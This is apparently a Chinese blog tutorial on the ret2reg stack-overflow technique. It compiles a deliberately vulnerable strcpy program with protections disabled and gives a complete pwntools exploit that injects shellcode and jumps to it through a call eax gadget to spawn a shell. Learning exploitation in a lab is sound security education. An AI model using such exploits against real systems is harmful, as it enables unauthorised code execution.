---
title: 中级ROP-ret2reg
date: 2026-09-18 08:19:57
categories: PWN
---

前面学习到的攻击方法，EIP注入的地址都必须是一个地址，否则无法攻击成功，安全人员为了保护免受此类攻击，发明了地址混淆技术，英文Address Space Layout Randomization，直译为 地址随机化，该技术将栈、堆和动态库空间全部随机化。32位系统上，随机量在64M范围内；而64位系统，随机量在2G范围内  
于是，ret2reg应运而生，即**返回寄存地址执行**的攻击方法  
函数内部实现时，溢出的缓冲区地址通常会加载到某个寄存器上，在后续的运行过程中不会被修改，尽管栈空间具有随机性，但该寄存器的值与缓冲区地址的关系是确定的，因此可以实现ret2reg攻击，常见于strcpy字符串拷贝函数中（strcpy函数返回时，会将目标地址存入eax中）

## 原理

1. 缓冲区溢出时地址会加载到某个寄存器上
2. 可以通过查找call寄存器或jmp寄存器，将EIP设置为指令地址
3. 将寄存器指向的空间上注入shellcode（可执行，通常为栈上）

## 利用思路

1. 通过gdb动调查看溢出函数返回时，哪个寄存器指向缓冲区地址
2. 向寄存器指向的缓冲区注入shellcode
3. 查找call该寄存器或者jmp该寄存器的gadget

## 防御方法

在函数ret前，将所有赋值过的寄存器置0

## 示例

自己手动编写一个简单的带有strcpy的栈溢出漏洞程序
```c
#include <stdio.h>    
#include <string.h>    

void vuln(char *input)
{    
    char buffer[512];    
    strcpy(buffer, input);    
}    

int main(int argc, char **argv)
{    
    vuln(argv[1]);    

    return 0;    
}
```
通过`gcc -g -m32 -o ret2reg ret2reg.c -fno-stack-protector -no-pic -fno-pie -z execstack -z relro`编译程序  
checksec查保护  
{% asset_img PixPin_2026-09-18_15-33-42.png %}  
ida分析发现strcpy的缓冲区溢出漏洞，可使用ret2reg攻击  
{% asset_img PixPin_2026-09-18_15-34-45.png %}  
gdb动调，通过cyclic传入600个字符，发现两个重要地方  
{% asset_img PixPin_2026-09-18_15-37-31.png %}  
首先，eax寄存器存储这溢出缓冲区的地址（这是由strcpy函数导致的，函数返回时会将目标地址作为返回值存入eax）；其次，函数返回值被覆盖为0x66616167，可通过cyclic算出需要填充字节数为524。接下来，我们只需要知道程序中`call eax`/`jmp eax`的指令地址便可构造出完整payload，我们可以利用ROPgadget找到  
{% asset_img PixPin_2026-09-18_15-44-43.png %}  
完整exp如下：
```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

shellcode = asm(shellcraft.sh())
call_eax_addr = 0x08049019

payload = shellcode.ljust(524, b'a') + p32(call_eax_addr)

io = process(argv=['./ret2reg', payload]) #argv参数列表，参数1为程序路径，参数2为传入程序的参数
io.interactive()
```
